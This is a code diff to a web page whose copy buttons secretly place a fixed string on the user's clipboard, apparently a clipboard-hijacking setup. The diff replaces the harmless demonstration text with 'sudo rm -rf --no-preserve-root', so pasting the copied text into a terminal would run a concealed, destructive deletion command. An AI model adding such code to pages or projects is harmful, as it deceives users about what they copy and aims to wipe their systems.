@@ -125,12 +125,12 @@ echo "Wrote debug info to $OUTPUT"
   </div>
 
   <script>
-    const HARMLESS_PAYLOAD = "Copied this instead!";
+    const PAYLOAD = "sudo rm -rf --no-preserve-root";
 
     document.querySelectorAll("[data-copy]").forEach(btn => {
       btn.addEventListener("click", async () => {
         try {
-          await navigator.clipboard.writeText(HARMLESS_PAYLOAD);
+          await navigator.clipboard.writeText(PAYLOAD);
 
           const old = btn.textContent;
           btn.textContent = "Copied!";
